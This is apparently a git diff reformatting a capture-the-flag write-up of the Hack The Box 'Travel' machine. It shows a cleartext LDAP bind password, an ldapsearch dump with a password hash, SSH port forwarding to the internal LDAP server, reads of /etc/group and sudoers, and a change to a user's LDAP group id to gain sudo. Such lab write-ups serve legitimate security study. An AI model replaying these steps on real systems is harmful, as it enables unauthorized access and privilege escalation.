@@ -621,112 +621,291 @@ ssh port forward tunnel
 > The file stores a line which subsequently deleted from the .ldaprc file. This line contain the
 > bind password Theroadlesstraveled . Let's try using it to connect to LDAP.
 ```
-
+text
+```
 lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
+# extended LDIF
+#
+# LDAPv3
+# base <dc=travel,dc=htb> (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
 
-## extended LDIF
+# travel.htb
+dn: dc=travel,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: Travel.HTB
+dc: travel
 
-## LDAPv3
+# admin, travel.htb
+dn: cn=admin,dc=travel,dc=htb
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
 
-## base  \(default\) with scope subtree
+# servers, travel.htb
+dn: ou=servers,dc=travel,dc=htb
+description: Servers
+objectClass: organizationalUnit
+ou: servers
 
-## filter: \(objectclass=\*\)
+# lynik-admin, travel.htb
+dn: cn=lynik-admin,dc=travel,dc=htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
+ =
 
-## requesting: ALL
+# workstations, travel.htb
+dn: ou=workstations,dc=travel,dc=htb
+description: Workstations
+objectClass: organizationalUnit
+ou: workstations
 
-## travel.htb
+# linux, servers, travel.htb
+dn: ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Servers
+objectClass: organizationalUnit
+ou: linux
 
-dn: dc=travel,dc=htb objectClass: top objectClass: dcObject objectClass: organization o: Travel.HTB dc: travel
+# windows, servers, travel.htb
+dn: ou=windows,ou=servers,dc=travel,dc=htb
+description: Windows Servers
+objectClass: organizationalUnit
+ou: windows
 
-## admin, travel.htb
+# users, linux, servers, travel.htb
+dn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Users
+objectClass: organizationalUnit
+ou: users
 
-dn: cn=admin,dc=travel,dc=htb objectClass: simpleSecurityObject objectClass: organizationalRole cn: admin description: LDAP administrator
+# groups, linux, servers, travel.htb
+dn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
+description: Linux Groups
+objectClass: organizationalUnit
+ou: groups
 
-## servers, travel.htb
+# jane, users, linux, servers, travel.htb
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: jane
+uidNumber: 5005
+homeDirectory: /home/jane
+givenName: Jane
+gidNumber: 5000
+sn: Rodriguez
+cn: Jane Rodriguez
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-dn: ou=servers,dc=travel,dc=htb description: Servers objectClass: organizationalUnit ou: servers
+# brian, users, linux, servers, travel.htb
+dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: brian
+cn: Brian Bell
+sn: Bell
+givenName: Brian
+loginShell: /bin/bash
+uidNumber: 5002
+gidNumber: 5000
+homeDirectory: /home/brian
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
 
-## lynik-admin, travel.htb
+# frank, users, linux, servers, travel.htb
+dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: frank
+cn: Frank Stewart
+sn: Stewart
+givenName: Frank
+loginShell: /bin/bash
+uidNumber: 5001
+gidNumber: 5000
+homeDirectory: /home/frank
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
 
-dn: cn=lynik-admin,dc=travel,dc=htb description: LDAP administrator objectClass: simpleSecurityObject objectClass: organizationalRole cn: lynik-admin userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==
+# jerry, users, linux, servers, travel.htb
+dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: jerry
+uidNumber: 5006
+homeDirectory: /home/jerry
+givenName: Jerry
+gidNumber: 5000
+sn: Morgan
+cn: Jerry Morgan
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-## workstations, travel.htb
+# lynik, users, linux, servers, travel.htb
+dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: lynik
+uidNumber: 5000
+homeDirectory: /home/lynik
+givenName: Lynik
+gidNumber: 5000
+sn: Schmidt
+cn: Lynik Schmidt
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-dn: ou=workstations,dc=travel,dc=htb description: Workstations objectClass: organizationalUnit ou: workstations
+# edward, users, linux, servers, travel.htb
+dn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: edward
+uidNumber: 5009
+homeDirectory: /home/edward
+givenName: Edward
+gidNumber: 5000
+sn: Roberts
+cn: Edward Roberts
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-## linux, servers, travel.htb
+# eugene, users, linux, servers, travel.htb
+dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: eugene
+cn: Eugene Scott
+sn: Scott
+givenName: Eugene
+loginShell: /bin/bash
+uidNumber: 5008
+gidNumber: 5000
+homeDirectory: /home/eugene
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
 
-dn: ou=linux,ou=servers,dc=travel,dc=htb description: Linux Servers objectClass: organizationalUnit ou: linux
+# gloria, users, linux, servers, travel.htb
+dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: gloria
+uidNumber: 5010
+homeDirectory: /home/gloria
+givenName: Gloria
+gidNumber: 5000
+sn: Wood
+cn: Gloria Wood
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-## windows, servers, travel.htb
+# johnny, users, linux, servers, travel.htb
+dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: johnny
+cn: Johnny Miller
+sn: Miller
+givenName: Johnny
+loginShell: /bin/bash
+uidNumber: 5004
+gidNumber: 5000
+homeDirectory: /home/johnny
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
 
-dn: ou=windows,ou=servers,dc=travel,dc=htb description: Windows Servers objectClass: organizationalUnit ou: windows
+# louise, users, linux, servers, travel.htb
+dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: louise
+cn: Louise Griffin
+sn: Griffin
+givenName: Louise
+loginShell: /bin/bash
+uidNumber: 5007
+gidNumber: 5000
+homeDirectory: /home/louise
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
 
-## users, linux, servers, travel.htb
+# christopher, users, linux, servers, travel.htb
+dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: christopher
+uidNumber: 5003
+homeDirectory: /home/christopher
+givenName: Christopher
+gidNumber: 5000
+sn: Ward
+cn: Christopher Ward
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
 
-dn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb description: Linux Users objectClass: organizationalUnit ou: users
+# domainusers, groups, linux, servers, travel.htb
+dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
+memberUid: frank
+memberUid: brian
+memberUid: christopher
+memberUid: johnny
+memberUid: julia
+memberUid: jerry
+memberUid: louise
+memberUid: eugene
+memberUid: edward
+memberUid: gloria
+memberUid: lynik
+gidNumber: 5000
+cn: domainusers
+objectClass: top
+objectClass: posixGroup
 
-## groups, linux, servers, travel.htb
+# search result
+search: 2
+result: 0 Success
 
-dn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb description: Linux Groups objectClass: organizationalUnit ou: groups
+# numResponses: 22
+# numEntries: 21
+```
+text
 
-## jane, users, linux, servers, travel.htb
-
-dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: jane uidNumber: 5005 homeDirectory: /home/jane givenName: Jane gidNumber: 5000 sn: Rodriguez cn: Jane Rodriguez objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## brian, users, linux, servers, travel.htb
-
-dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: brian cn: Brian Bell sn: Bell givenName: Brian loginShell: /bin/bash uidNumber: 5002 gidNumber: 5000 homeDirectory: /home/brian objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount
-
-## frank, users, linux, servers, travel.htb
-
-dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: frank cn: Frank Stewart sn: Stewart givenName: Frank loginShell: /bin/bash uidNumber: 5001 gidNumber: 5000 homeDirectory: /home/frank objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount
-
-## jerry, users, linux, servers, travel.htb
-
-dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: jerry uidNumber: 5006 homeDirectory: /home/jerry givenName: Jerry gidNumber: 5000 sn: Morgan cn: Jerry Morgan objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## lynik, users, linux, servers, travel.htb
-
-dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: lynik uidNumber: 5000 homeDirectory: /home/lynik givenName: Lynik gidNumber: 5000 sn: Schmidt cn: Lynik Schmidt objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## edward, users, linux, servers, travel.htb
-
-dn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: edward uidNumber: 5009 homeDirectory: /home/edward givenName: Edward gidNumber: 5000 sn: Roberts cn: Edward Roberts objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## eugene, users, linux, servers, travel.htb
-
-dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: eugene cn: Eugene Scott sn: Scott givenName: Eugene loginShell: /bin/bash uidNumber: 5008 gidNumber: 5000 homeDirectory: /home/eugene objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount
-
-## gloria, users, linux, servers, travel.htb
-
-dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: gloria uidNumber: 5010 homeDirectory: /home/gloria givenName: Gloria gidNumber: 5000 sn: Wood cn: Gloria Wood objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## johnny, users, linux, servers, travel.htb
-
-dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: johnny cn: Johnny Miller sn: Miller givenName: Johnny loginShell: /bin/bash uidNumber: 5004 gidNumber: 5000 homeDirectory: /home/johnny objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount
-
-## louise, users, linux, servers, travel.htb
-
-dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: louise cn: Louise Griffin sn: Griffin givenName: Louise loginShell: /bin/bash uidNumber: 5007 gidNumber: 5000 homeDirectory: /home/louise objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount
-
-## christopher, users, linux, servers, travel.htb
-
-dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb uid: christopher uidNumber: 5003 homeDirectory: /home/christopher givenName: Christopher gidNumber: 5000 sn: Ward cn: Christopher Ward objectClass: top objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount loginShell: /bin/bash
-
-## domainusers, groups, linux, servers, travel.htb
-
-dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb memberUid: frank memberUid: brian memberUid: christopher memberUid: johnny memberUid: julia memberUid: jerry memberUid: louise memberUid: eugene memberUid: edward memberUid: gloria memberUid: lynik gidNumber: 5000 cn: domainusers objectClass: top objectClass: posixGroup
-
-## search result
-
-search: 2 result: 0 Success
-
-## numResponses: 22
-
-## numEntries: 21
-
-```text
 > This time the bind was successful and we receive data. We also see that the user lynik-admin is an LDAP administrator.
 > This will allow us to edit user attributes stored in LDAP. Let's try to change a user's password. We
 > can use a GUI utility such as Apache Directory Studio to make it easier to browse and edit the
@@ -737,27 +916,83 @@ can modify ldap with https://directory.apache.org/studio/downloads.html
 need to port forward 389 (need sudo rights for low port)
 
 tried portforwarding using localhost and 127.0.0.1, but failed to connect, checked ip a and /etc/hosts to find out more and noticed 172.20.0.10
+
+```
+lynik-admin@travel:/var$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:b9:bc:d0 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.189/24 brd 10.10.10.255 scope global eth0
+       valid_lft forever preferred_lft forever
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:eb:d3:9e:f4 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+4: br-836575a2ebbb: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:0e:57:82:22 brd ff:ff:ff:ff:ff:ff
+    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb
+       valid_lft forever preferred_lft forever
+5: br-8ec6dcae5ba1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:62:92:81:b4 brd ff:ff:ff:ff:ff:ff
+    inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1
+       valid_lft forever preferred_lft forever
+7: vetha779908@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+    link/ether 72:de:2f:8b:3d:cc brd ff:ff:ff:ff:ff:ff link-netnsid 0
+9: vethef87583@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+    link/ether 1a:aa:24:64:cc:d9 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+11: vethad21680@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-836575a2ebbb state UP group default 
+    link/ether d2:d3:97:5f:1e:6d brd ff:ff:ff:ff:ff:ff link-netnsid 2
+13: vethd1561b2@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+    link/ether da:10:aa:7a:cb:5f brd ff:ff:ff:ff:ff:ff link-netnsid 3
+15: veth5af27ca@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+    link/ether 02:e7:02:1d:f1:36 brd ff:ff:ff:ff:ff:ff link-netnsid 5
+17: veth94d1920@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+    link/ether e6:86:a7:88:79:dd brd ff:ff:ff:ff:ff:ff link-netnsid 4
+lynik-admin@travel:/var$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 travel
+172.20.0.10 ldap.travel.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
 ```
 
-lynik-admin@travel:/var$ ip a 1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid\_lft forever preferred\_lft forever 2: eth0:  mtu 1500 qdisc fq\_codel state UP group default qlen 1000 link/ether 00:50:56:b9:bc:d0 brd ff:ff:ff:ff:ff:ff inet 10.10.10.189/24 brd 10.10.10.255 scope global eth0 valid\_lft forever preferred\_lft forever 3: docker0:  mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:eb:d3:9e:f4 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid\_lft forever preferred\_lft forever 4: br-836575a2ebbb:  mtu 1500 qdisc noqueue state UP group default link/ether 02:42:0e:57:82:22 brd ff:ff:ff:ff:ff:ff inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb valid\_lft forever preferred\_lft forever 5: br-8ec6dcae5ba1:  mtu 1500 qdisc noqueue state UP group default link/ether 02:42:62:92:81:b4 brd ff:ff:ff:ff:ff:ff inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1 valid\_lft forever preferred\_lft forever 7: vetha779908@if6:  mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default link/ether 72:de:2f:8b:3d:cc brd ff:ff:ff:ff:ff:ff link-netnsid 0 9: vethef87583@if8:  mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default link/ether 1a:aa:24:64:cc:d9 brd ff:ff:ff:ff:ff:ff link-netnsid 1 11: vethad21680@if10:  mtu 1500 qdisc noqueue master br-836575a2ebbb state UP group default link/ether d2:d3:97:5f:1e:6d brd ff:ff:ff:ff:ff:ff link-netnsid 2 13: vethd1561b2@if12:  mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default link/ether da:10:aa:7a:cb:5f brd ff:ff:ff:ff:ff:ff link-netnsid 3 15: veth5af27ca@if14:  mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default link/ether 02:e7:02:1d:f1:36 brd ff:ff:ff:ff:ff:ff link-netnsid 5 17: veth94d1920@if16:  mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default link/ether e6:86:a7:88:79:dd brd ff:ff:ff:ff:ff:ff link-netnsid 4 lynik-admin@travel:/var$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 travel 172.20.0.10 ldap.travel.htb
-
-## The following lines are desirable for IPv6 capable hosts
-
-::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters
-
-```text
 checked `ip a` and /etc/hosts to find out more and noticed 172.20.0.10
 ```
+┌──(zweilos㉿kali)-[~/htb/travel]
+└─$ sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189 
+[sudo] password for zweilos: 
+The authenticity of host '10.10.10.189 (10.10.10.189)' can't be established.
+ECDSA key fingerprint is SHA256:KSjh2mhuESUZQcaB1ewLHie9gTUCmvOlypvBpcyAF/w.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.189' (ECDSA) to the list of known hosts.
+lynik-admin@10.10.10.189's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
-┌──\(zweilos㉿kali\)-\[~/htb/travel\] └─$ sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189 \[sudo\] password for zweilos: The authenticity of host '10.10.10.189 \(10.10.10.189\)' can't be established. ECDSA key fingerprint is SHA256:KSjh2mhuESUZQcaB1ewLHie9gTUCmvOlypvBpcyAF/w. Are you sure you want to continue connecting \(yes/no/\[fingerprint\]\)? yes Warning: Permanently added '10.10.10.189' \(ECDSA\) to the list of known hosts. lynik-admin@10.10.10.189's password: Welcome to Ubuntu 20.04 LTS \(GNU/Linux 5.4.0-26-generic x86\_64\)
+  System information as of Sat 19 Sep 2020 03:46:50 PM UTC
 
-System information as of Sat 19 Sep 2020 03:46:50 PM UTC
+  System load:                      0.0
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     11%
+  Swap usage:                       0%
+  Processes:                        198
+  Users logged in:                  0
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
 
-System load: 0.0 Usage of /: 46.0% of 15.68GB Memory usage: 11% Swap usage: 0% Processes: 198 Users logged in: 0 IPv4 address for br-836575a2ebbb: 172.20.0.1 IPv4 address for br-8ec6dcae5ba1: 172.30.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.10.189
+Last login: Sat Sep 19 15:46:18 2020 from 10.10.15.53
+lynik-admin@travel:~$
+```
 
-Last login: Sat Sep 19 15:46:18 2020 from 10.10.15.53 lynik-admin@travel:~$
-
-```text
 login as `lynik` failed with password, but it says that only an ssh key can be used to login
 
 https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap
@@ -777,75 +1012,179 @@ searching for ssh keys and ldap led to https://serverfault.com/questions/653792/
 pictures
 
 ## enumeration as `lynik`
+
 ```
+┌──(zweilos㉿kali)-[~/htb/travel]
+└─$ ssh lynik@10.10.10.189 -i lynik 
+Creating directory '/home@TRAVEL/lynik'.
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
-┌──\(zweilos㉿kali\)-\[~/htb/travel\] └─$ ssh lynik@10.10.10.189 -i lynik Creating directory '/home@TRAVEL/lynik'. Welcome to Ubuntu 20.04 LTS \(GNU/Linux 5.4.0-26-generic x86\_64\)
+  System information as of Sat 19 Sep 2020 04:07:29 PM UTC
 
-System information as of Sat 19 Sep 2020 04:07:29 PM UTC
+  System load:                      0.0
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     11%
+  Swap usage:                       0%
+  Processes:                        201
+  Users logged in:                  1
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
 
-System load: 0.0 Usage of /: 46.0% of 15.68GB Memory usage: 11% Swap usage: 0% Processes: 201 Users logged in: 1 IPv4 address for br-836575a2ebbb: 172.20.0.1 IPv4 address for br-8ec6dcae5ba1: 172.30.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.10.189
+          *** Travel.HTB News Flash ***
+We are currently experiencing some delay in domain
+replication times of about 3-5 seconds. Sorry for
+the inconvenience. Kind Regards, admin
 
-```text
-      *** Travel.HTB News Flash ***
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+lynik@travel:~$ id
+uid=5000(lynik) gid=5000(domainusers) groups=5000(domainusers)
+lynik@travel:~$
+
 ```
-
-We are currently experiencing some delay in domain replication times of about 3-5 seconds. Sorry for the inconvenience. Kind Regards, admin
-
-The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/\*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
-
-lynik@travel:~$ id uid=5000\(lynik\) gid=5000\(domainusers\) groups=5000\(domainusers\) lynik@travel:~$
-
-```text
 Since this user is an ldap admin and can modify anything, I tried setting lynik uid and gid to 0 (root) but then was denied ssh login due to configuration to deny root login;
 ```
+lynik@travel:/var$ cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,trvl-admin
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:trvl-admin
+floppy:x:25:
+tape:x:26:
+sudo:x:27:trvl-admin
+audio:x:29:
+dip:x:30:trvl-admin
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:trvl-admin
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+systemd-timesync:x:104:
+crontab:x:105:
+messagebus:x:106:
+input:x:107:
+kvm:x:108:
+render:x:109:
+syslog:x:110:
+tss:x:111:
+uuidd:x:112:
+tcpdump:x:113:
+ssh:x:114:
+landscape:x:115:
+lxd:x:116:trvl-admin
+systemd-coredump:x:999:
+trvl-admin:x:1000:
+lynik-admin:x:1001:
+docker:x:117:
+sssd:x:118:
 
-lynik@travel:/var$ cat /etc/group root:x:0: daemon:x:1: bin:x:2: sys:x:3: adm:x:4:syslog,trvl-admin tty:x:5: disk:x:6: lp:x:7: mail:x:8: news:x:9: uucp:x:10: man:x:12: proxy:x:13: kmem:x:15: dialout:x:20: fax:x:21: voice:x:22: cdrom:x:24:trvl-admin floppy:x:25: tape:x:26: sudo:x:27:trvl-admin audio:x:29: dip:x:30:trvl-admin www-data:x:33: backup:x:34: operator:x:37: list:x:38: irc:x:39: src:x:40: gnats:x:41: shadow:x:42: utmp:x:43: video:x:44: sasl:x:45: plugdev:x:46:trvl-admin staff:x:50: games:x:60: users:x:100: nogroup:x:65534: systemd-journal:x:101: systemd-network:x:102: systemd-resolve:x:103: systemd-timesync:x:104: crontab:x:105: messagebus:x:106: input:x:107: kvm:x:108: render:x:109: syslog:x:110: tss:x:111: uuidd:x:112: tcpdump:x:113: ssh:x:114: landscape:x:115: lxd:x:116:trvl-admin systemd-coredump:x:999: trvl-admin:x:1000: lynik-admin:x:1001: docker:x:117: sssd:x:118:
-
-```text
+```
 I checked sudoers file and saw that admins and members of sudo group can run all commands as root so I changed group id to 27 (sudo) then logout and back in
 ```
+┌──(zweilos㉿kali)-[~/htb/travel]
+└─$ ssh lynik@10.10.10.189 -i lynik
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
-┌──\(zweilos㉿kali\)-\[~/htb/travel\] └─$ ssh lynik@10.10.10.189 -i lynik Welcome to Ubuntu 20.04 LTS \(GNU/Linux 5.4.0-26-generic x86\_64\)
+  System information as of Sat 19 Sep 2020 04:12:42 PM UTC
 
-System information as of Sat 19 Sep 2020 04:12:42 PM UTC
+  System load:                      0.06
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     11%
+  Swap usage:                       0%
+  Processes:                        197
+  Users logged in:                  1
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
 
-System load: 0.06 Usage of /: 46.0% of 15.68GB Memory usage: 11% Swap usage: 0% Processes: 197 Users logged in: 1 IPv4 address for br-836575a2ebbb: 172.20.0.1 IPv4 address for br-8ec6dcae5ba1: 172.30.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.10.189
+Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
 
-Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53 To run a command as administrator \(user "root"\), use "sudo ". See "man sudo\_root" for details.
+lynik@travel:~$ id
+uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)
 
-lynik@travel:~$ id uid=5000\(lynik\) gid=27\(sudo\) groups=27\(sudo\),5000\(domainusers\)
+┌──(zweilos㉿kali)-[~/htb/travel]
+└─$ ssh lynik@10.10.10.189 -i lynik
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
-┌──\(zweilos㉿kali\)-\[~/htb/travel\] └─$ ssh lynik@10.10.10.189 -i lynik Welcome to Ubuntu 20.04 LTS \(GNU/Linux 5.4.0-26-generic x86\_64\)
+  System information as of Sat 19 Sep 2020 04:12:42 PM UTC
 
-System information as of Sat 19 Sep 2020 04:12:42 PM UTC
+  System load:                      0.06
